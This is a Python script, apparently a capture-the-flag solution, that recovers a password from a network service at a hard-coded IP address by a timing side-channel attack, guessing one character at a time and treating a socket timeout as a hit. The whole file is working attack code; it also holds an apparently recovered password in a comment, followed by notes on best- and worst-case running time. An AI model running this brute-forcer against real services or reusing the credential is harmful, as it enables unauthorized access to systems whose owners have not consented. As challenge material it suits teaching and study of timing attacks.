import socket

host = '143.0.100.198'
port = 60123

def createSocket(tm) -> socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(tm)
    return s

def recv(s, sz = 4096):
    return s.recv(sz).decode()

def send(s, msg):
    s.send(msg.encode())

alphabet = ''.join([chr(x) for x in range(32, 127)]) # ASCII without controls or DEL

password = ""

while(1):
    for x in alphabet:
        with createSocket(len(password) + 2) as s: # Each character is checked roughly in one second
            recv(s)
            send(s, password + x)
            try:
                msg = recv(s)
                if(msg == u''):
                    continue
                print('Congratulations message?', msg)
                print('The password is', password + x)
                exit(0)
            except socket.timeout:
                print('Found character', x)
                password += x

# GaAVCK9r3K

# bestTime = O(n^2), where n is the number of characters of the password. Why?
# When you send a string with length x, you need to wait for x seconds,
# Therefore if every message sent is correct, you will wait for 1 + 2 + 3 + ... + n seconds = n * (n + 1) / 2

# worstTime = O(n^2) with big constant (95 times more compared to best case), where n is the number of characters of the password. Why?
# Similar reasons to the best case, but this time you never guess correctly, except for the last time on the current char,
# therefore, you need to wait for 95 + 95 * 2 + 95 * 3 + ... + 95 * n seconds = 95 * n * (n + 1) / 2

# With n = 10, this will amount to 45 seconds vs 1 hour and 11 minutes